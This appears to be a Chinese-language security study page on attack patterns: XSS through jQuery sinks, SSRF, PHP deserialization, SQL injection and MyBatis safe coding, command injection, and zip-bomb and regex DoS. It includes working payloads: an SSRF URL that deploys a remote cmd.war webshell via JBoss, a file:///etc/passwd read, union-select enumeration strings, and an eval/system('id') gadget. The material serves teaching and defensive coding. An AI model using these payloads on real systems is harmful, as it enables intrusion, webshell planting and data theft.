# attack_pattern

## XSS

???+ tip
    使用 **AngularJS** 框架的应用, 检查页面元素, 属性中携带`class="ng-binding"`的即为绑定输出, 已经过输出编码, 不存在XSS.

### jQuery

> 如果使用`$('#id').text()`或`$('#id').val()`, 则不存在XSS.

???+ danger
    存在XSS的方法:

    - `$('#id').append()`
    - `$('#id').html()`
    - after
    - appendTo
    - before
    - insertAfter
    - insertBefore
    - prepend
    - prependTo
    - replaceAll
    - replaceWith
    - unwrap
    - wrap
    - wrapAll
    - wrapInner

```html hl_lines="11 14"
<!DOCTYPE html>
<html>
<head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script>
$(document).ready(function(){
  $("#textbtn").click(function(){
    $("#test1").text("<h1>Hello islibra world!</h1>");
  });
  $("#appendbtn").click(function(){
    $("#test1").append("<h1>Hello islibra world!</h1><script>alert('xss')<\/script>");
  });
  $("#htmlbtn").click(function(){
    $("#test2").html("<b>Hello world!</b>");
  });
  $("#valuebtn").click(function(){
    $("#test3").val("\"><h1>Dolly</h1> Duck");
  });
});
</script>
</head>
<body>

<p id="test1">This is a paragraph.</p>
<p id="test2">This is another paragraph.</p>

<p>Input field: <input type="text" id="test3" value="Mickey Mouse"></p>

<button id="textbtn">Set Text</button>
<button id="appendbtn">Append Text</button>
<button id="htmlbtn">Set HTML</button>
<button id="valuebtn">Set Value</button>

</body>
</html>
```


## SSRF

> 所有场景都可攻击 **内网** 或 **本地**

1. 请求非http服务的端口
    - 返回banner信息，如：`http://scanme.nmap.org:22/test.txt`返回OpenSSH版本, `http://127.0.0.1:3306/test.txt`返回MySQL版本.
    - 探测端口开放状态, 如请求关闭的端口: `http://scanme.nmap.org:25/test.txt`报错.
1. 正则表达式攻击造成应用程序溢出
    - 如果`9876`端口开放, 构造`http://127.0.0.1:9876/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`使进程崩溃.
1. 通过访问默认文件, 识别应用
    - `http://10.0.0.1/portName.js`可以根据返回结果判断是否是 Dlink 路由器.
1. 访问内网web应用, 构造GET参数实现命令注入, SQL注入, 部署webshell等.
    - `http://127.0.0.1/jmx-console/?name=jboss.system:service=MainDeployer&methodIndex=17&{==arg0=http://our_public_internet_server/utils/cmd.war==}`
1. 请求非http协议, 读取本地文件, 如: `file:///etc/passwd`。
1. 间接获取内置帐号token。

## 反序列化

```php
<?php
// 定义类
class Cl{
    var $test = "hello";
    var $age = 3;

    // magic函数会被自动调用
    // 命名是以符号开头的，比如 __construct, __destruct, __toString, __sleep, __wakeup
    function __destruct(){
        // 序列化调用一次, 反序列化调用一次
        echo $this->test;
        // 注入点
        eval("$this->test");
    }
}
$c = new Cl();
// 序列化
$sc = serialize($c);
// object:类名长度:类名:属性数量:{s属性类型字符串:属性名称;s属性类型字符串:属性值;s属性类型字符串:属性名称;i属性类型整型:属性值}
// O:1:"C":1:{s:4:"test";s:5:"hello";}
// O:2:"Cl":1:{s:4:"test";s:5:"hello";}
// O:2:"Cl":2:{s:4:"test";s:5:"hello";s:3:"age";i:3;}
print_r($sc);
echo "<br>";
// 反序列化
$sc = 'O:2:"Cl":2:{s:4:"test";s:13:"system(\'id\');";s:3:"age";i:3;}';
// uid=1(daemon) gid=1(daemon) groups=1(daemon)
$uc = unserialize($sc);
// hello
print_r($uc->test);
?>
```

## SQL注入

### 注释

- 通用单行注释: `-- `, {==注意后面跟一个空格==}, 如`flag' or 1=1 -- `
- 通用多行注释: `/* ... */`
- MySQL单行注释: `#`, 如`flag' or 1=1 #`

### 常用POC

- 查询全部数据`flag' or 1=1 #`或`flag' or 1=1 -- `
- 猜解列数`flag' union select 1,2,3 #`, 返回的数据为1, 2, 3
- 猜解数据库名, 表名`flag' and exist(select * from xxx) #`或`' and 0 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #`, 使用`and 0`先将干扰数据清零, 再查询`INFORMATION_SCHEMA`库中的`COLUMNS`表获取数据库名和表名
- 猜解列名, 数据类型`flag' and exist(select xxx from xxx) #`或`' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='xxx'#`

### 框架

#### JDBC

```java tab="错误的做法"
// 拼接SQL语句
String sql = "SELECT * FROM users WHERE name ='" + name + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(sql);
```

```java tab="推荐的做法"
// 使用占位符 ? 和预编译
String sql = "SELECT * FROM users WHERE name= ? ";
PreparedStatement ps = connection.prepareStatement(sql);
// 参数 index 从 1 开始
ps.setString(1, name);
```

???+ warning
    **order by** 不能使用参数绑定，需要通过白名单过滤。


#### MyBatis

##### XML

定义Mapper接口:

```java
@Mapper
public interface UserMapper {
    User getById(int id);
}
```

XML配置文件:

```xml
<select id="getById" resultType="org.example.User">
    SELECT * FROM user WHERE id = #{id}
</select>
```

##### Annotation

```java
@Mapper
public interface UserMapper {
    @Select("SELECT * FROM user WHERE id= #{id}")
    User getById(@Param("id") int id);
}
```

???+ danger "安全风险"
    - 使用`#{}`会自动生成`PreparedStatement`, 可有效防止SQL注入.
    - 而使用`${}`会直接注入原始字符串, 导致 {==SQL注入==}, 注意注入的 **参数类型要为字符串**!  
        ```xml
        <select id="getByName" resultType="org.example.User">
            SELECT * FROM user WHERE name = '${name}' limit 1
        </select>
        <!--当name的值为 ' or '1'='1 时, 相当于执行-->
        <!--SELECT * FROM user WHERE name = '' or '1'='1' limit 1-->
        ```

???+ warning
    - **order by** 使用`#{}`会被替换为字符串, 如`ORDER BY #{sortBy}`  ^sortBy=name^-->  `ORDER BY "name"`, 因此需要通过白名单过滤, 或使用if标签, 如:

        ```java tab="Java"
        List<User> getUserListSortBy(@Param("sortBy") String sortBy);
        ```

        ```xml tab="xml"
        <select id="getUserListSortBy" resultMap="org.example.User">
            select * from user
            <if test="sortBy == 'name' or sortBy = 'email'">
                order by ${sortBy}
            </if>
        </select>
        ```

        ```xml tab="带默认值的情况"
        <select id="getUserListSortBy" resultMap="org.example.User">
            select * from user
            <choose>
                <when test="sortBy == 'name' or sortBy = 'email'">
                    order by ${sortBy}
                </when>
                <otherwise>
                    order by name
                </otherwise>
            </choose>
        </select>
        ```

    - **like** 需要使用通配符`%`和`_`
        - 方法一: 在Java中参数值两边拼接`%`, 再使用`#{}`
        - 方法二: 在xml中使用`bind`标签构造新参数, 再使用`#{}`

            ```java tab="Java"
            List<User> getUserListLike(@Param("name") String name);
            ```

            ```xml tab="xml"
            <select id="getUserListLike" resultType="org.example.User">
                <bind name="pattern" value="'%' + name + '%'" />
                    SELECT * FROM user WHERE name LIKE #{pattern}
            </select>
            ```

        - 方法三: 在xml中使用SQL语法`concat()`函数

            ```xml
            <select id="getUserListLikeConcat" resultType="org.example.User">
                SELECT * FROM user WHERE name LIKE concat ('%', #{name}, '%')
            </select>
            ```

    ???+ danger
        需要对用户输入进行过滤, 防止在大数据量情况下输入`{==%%==}`导致{==DOS==}。

    - **in**, 使用`<foreach>`和`#{}`

        ```java tab="Java"
        List<User> getUserListIn(@Param("nameList") List<String> nameList);
        ```

        ```xml tab="xml"
        <select id="selectUserIn" resultType="com.example.User">
            SELECT * FROM user WHERE name in
            <foreach item="name" collection="nameList" open="(" separator="," close=")">
                #{name}
            </foreach>
        </select>
        ```

    - **limit**, 使用`#{}`

        ```java tab="Java"
        List<User> getUserListLimit(@Param("offset") int offset, @Param("limit") int limit);
        ```

        ```xml tab="xml"
        <select id="getUserListLimit" resultType="org.example.User">
            SELECT * FROM user limit #{offset}, #{limit}
        </select>
        ```

#### JPA & Hibernate

略


???+ quote "参考链接"
    [彻底干掉恶心的 SQL 注入漏洞， 一网打尽！](https://mp.weixin.qq.com/s/hdOnO-tSGkQp0Wq3wcsIkw)


## 命令注入

### Java

```java
import java.io.IOException;

public class OSi {
    public static void main(String args[])
    {
        System.out.println("Start");

        String cmd = "mkdir ddd;id>hack.txt";
        //String[] cmds = cmd.split(" ");
        try {
            // 关注cmd是否 {==完全可控==}
            // Runtime.getRuntime().exec(cmd);
            // 关注String[] {==第一个元素==} 是否可控或为 {==/bin/sh==}
            Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
        } catch (IOException e) {
            System.out.println(e);
        }

        System.out.println("End");
    }
}
```

!!! success "如果传入String[]且第一个元素不是`/bin/sh`, 则不存在命令注入"

### Python格式化字符串漏洞

!!! quote "[格式化字符串](../../coding/python/0x01_datatype/#_3)"

### Go

!!! quote "[OS命令注入](../../coding/go/go%E8%AF%AD%E8%A8%80%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/#os)"


## DoS

### zip

1. 使用root制作高压缩比文件：`dd if=/dev/zero count=$((1024*1024)) bs=4096 > big.csv`
1. 压缩：`zip -9 big.zip big.csv`

### 正则表达式

- 使用[REGEXPER](https://regexper.com/)解析，是否存在两层以上的循环。
- <https://jex.im/regulex/>
